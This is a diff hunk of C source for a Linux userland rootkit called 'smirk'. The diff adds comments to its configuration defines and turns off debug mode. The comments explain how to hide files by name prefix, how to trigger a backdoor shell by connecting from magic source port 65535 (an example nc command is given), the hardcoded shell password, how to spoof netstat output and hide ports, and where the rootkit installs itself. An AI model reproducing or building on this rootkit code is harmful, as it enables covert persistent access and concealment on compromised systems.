@@ -13,15 +13,31 @@
 #include <unistd.h>
 #include <sys/stat.h>
 
-#define DEBUG
+// enable/disable debug 
+//#define DEBUG
+
+// killswitch file: if you create this file the rootkit will sadly uninstall :_(_
 #define KILLSWITCH "/dev/shm/.smirkkill"
 
+// libc library
 #define LIBC "libc.so.6"
+
+// prefix used to hide file
 #define MAGIC_PREFIX "^\\.smirk" //regex format
+
+// source port number used to make the call e.g. $ nc -p 65535 <target> <port> 
 #define MAGIC_PORT 65535
-#define FAKE_NETSTAT_FILE "/dev/shm/.smirknet-"
-#define PORTSPOOF_FILE "/dev/shm/.smirknet"
+
+// shell password, wrong password returns a peace message
 #define PASSWORD "SmirkFTW"
+
+// files used to store fake netstat informations
+#define FAKE_NETSTAT_FILE "/dev/shm/.smirknet-"
+
+// in this file you can store the ports that you want to hide
+#define PORTSPOOF_FILE "/dev/shm/.smirknet"
+
+// smirk will be installed there when you load it first time
 #define MAGIC_LIBPATH "/lib/.smirk.so"
 
 void *libc;
